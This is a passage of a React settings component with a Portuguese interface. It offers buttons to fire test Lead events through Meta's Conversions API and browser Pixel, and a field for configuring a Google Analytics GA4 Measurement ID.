                    disabled={testing}
                    className="flex items-center gap-2 rounded-lg border border-border bg-muted/30 px-3 py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors disabled:opacity-50"
                  >
                    <FlaskConical className="h-4 w-4" />
                    {testing ? "Enviando..." : "Disparar Lead (CAPI)"}
                  </button>
                  <button
                    onClick={handleTestWebEvent}
                    disabled={testingWeb}
                    className="flex items-center gap-2 rounded-lg border border-border bg-muted/30 px-3 py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors disabled:opacity-50"
                  >
                    <FlaskConical className="h-4 w-4" />
                    {testingWeb ? "Enviando..." : "Disparar Lead (Pixel Web)"}
                  </button>
                </div>

                {/* CAPI test result */}
                {testResult && (
                  <div className={`flex items-start gap-2 rounded-lg border px-3 py-2.5 text-xs font-mono ${
                    testResult.ok
                      ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
                      : "bg-destructive/10 border-destructive/30 text-destructive"
                  }`}>
                    <span className="shrink-0">{testResult.ok ? "✓" : "✗"}</span>
                    <span className="break-all">CAPI: {testResult.message}</span>
                  </div>
                )}

                {/* Web pixel test result */}
                {testResultWeb && (
                  <div className={`flex items-start gap-2 rounded-lg border px-3 py-2.5 text-xs font-mono ${
                    testResultWeb.ok
                      ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
                      : "bg-destructive/10 border-destructive/30 text-destructive"
                  }`}>
                    <span className="shrink-0">{testResultWeb.ok ? "✓" : "✗"}</span>
                    <span className="break-all">Pixel Web: {testResultWeb.message}</span>
                  </div>
                )}

                <div className="rounded-lg bg-muted/50 border border-border px-3 py-2.5 text-[11px] text-muted-foreground space-y-1">
                  <p><strong className="text-foreground">CAPI:</strong> dispara server-side via Conversions API. Aparece na aba <em>Testar eventos</em> do Gerenciador de Eventos.</p>
                  <p><strong className="text-foreground">Pixel Web:</strong> dispara browser-side via <code className="bg-muted px-1 rounded">window.fbq</code>. Aparece no Meta Pixel Helper e na aba Atividade do pixel.</p>
                  <p>O código de teste é usado apenas nesta sessão e não é salvo.</p>
                </div>
              </div>
            </div>
          </CollapsibleSection>

          <CollapsibleSection icon={BarChart3} title="Google Analytics (GA4)" badge={
            googleId ? <StatusBadge active label="Configurado" /> : <StatusBadge active={false} label="Não configurado" />
          } defaultOpen>
            <div className="p-4 space-y-3">
              <div>
                <label className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase mb-1.5 block">Measurement ID</label>
                <input value={googleId} onChange={(e) => { setGoogleId(e.target.value); markDirty(); }} placeholder="G-XXXXXXXXXX" className={monoInputClass} />
              </div>
              <div className="rounded-lg bg-muted/50 border border-border px-3 py-2 text-[11px] text-muted-foreground">
                O script do GA4 é carregado automaticamente após salvar. Eventos de <code className="bg-muted px-1 rounded">page_view</code> e <code className="bg-muted px-1 rounded">generate_lead</code> são disparados automaticamente pelo fluxo.
              </div>
            </div>
          </CollapsibleSection>
        </TabsContent>
      </Tabs>
    </div>
  );
}
